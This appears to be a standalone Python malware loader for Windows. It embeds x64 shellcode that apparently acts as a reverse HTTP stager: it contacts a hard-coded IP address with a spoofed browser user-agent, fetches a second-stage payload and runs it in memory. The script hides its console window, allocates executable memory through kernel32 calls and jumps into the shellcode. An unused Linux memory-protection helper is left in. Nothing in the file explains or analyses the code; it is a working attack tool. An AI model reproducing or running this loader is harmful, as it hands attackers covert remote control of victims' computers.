# PYTHONIOENCODING=utf-8 python code.py
from ctypes import *
import ctypes
# length: 890 bytes
buf = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x99\x1f\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x54\x50\x4d\x6c\x00\x96\xef\x08\x13\x07\x7a\xf2\x7c\xa3\xfa\x9f\x31\xf0\x8f\xd5\x81\xf2\x46\xfe\xc4\xe7\x85\xef\xb0\x60\x18\x86\x59\x53\xef\x2c\x02\xd1\x14\x92\xac\xdb\x33\x44\x58\xb5\xa7\x37\x0f\xc1\x03\xa9\xe2\xf7\x78\xbd\x0f\x75\x77\xab\x92\x1e\xc4\x28\x42\x52\x81\x79\xe5\x6f\x87\x75\xb1\xb4\x7e\xa2\x77\x0a\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x35\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x3b\x20\x44\x69\x67\x45\x78\x74\x3b\x20\x44\x54\x53\x20\x41\x67\x65\x6e\x74\x0d\x0a\x00\x18\x09\x4f\x1e\x2a\x89\x27\x03\xbb\x00\x70\x1d\xf5\xe5\x60\x88\x95\x9e\xa5\x2d\xc0\x00\xa0\xbe\x62\x9b\x48\x69\xbc\x1f\xab\x11\x12\x67\x8e\x9b\x60\xf2\x2d\x3f\x82\xe6\x0b\x0c\x5d\x11\x4c\x69\xec\xe0\x31\x02\x3b\xeb\x25\x9c\x82\x7f\x9d\x8d\x3a\x3e\xe9\x25\x69\x45\xc7\x7b\xad\x39\x09\x89\x35\xc2\x49\xfc\xf7\x13\x21\xcb\x44\x6f\x1b\x69\xd4\xa5\x2a\xb7\x17\x02\xb8\xb4\x6e\x7c\x5c\xc7\x88\x61\x6a\x0a\xb9\x72\xa2\x61\x46\x7e\x60\xc4\x4a\x93\xb7\xf9\xbf\xfb\x8b\xd5\x12\x5c\xea\x53\x93\x04\xd0\x80\x58\x68\x8e\x04\xb0\x93\x1c\x26\x39\xc7\x15\x91\x45\xb2\x9f\xc7\xbc\xeb\x8c\xd9\x82\xc1\xb6\xc8\x1a\x13\x55\x4c\x9a\x0f\xb7\x40\x47\x1a\x3e\xdf\xb9\xdb\x5a\x59\x73\x54\x94\x65\x69\x30\x74\x5a\x80\x4d\x1c\x7d\xae\xb7\x1a\xb2\xe3\xf2\xee\x06\xb5\xd7\x94\x1c\xc3\x8d\x60\x98\x28\x55\x1a\x94\xe8\x73\x28\x4e\x46\x11\xae\x47\xd3\xef\x60\xa7\xf3\xde\xb6\x1a\x91\x39\x2e\x52\x61\x66\x77\x12\x7a\xb8\xe7\x08\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x37\x33\x2e\x31\x2e\x31\x37\x00\x19\x69\xa0\x8d"

#libc = CDLL('libc.so.6')
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr:
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()
if whnd != 0:
       if 1:
              ctypes.windll.user32.ShowWindow(whnd, 0)
              ctypes.windll.kernel32.CloseHandle(whnd)
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()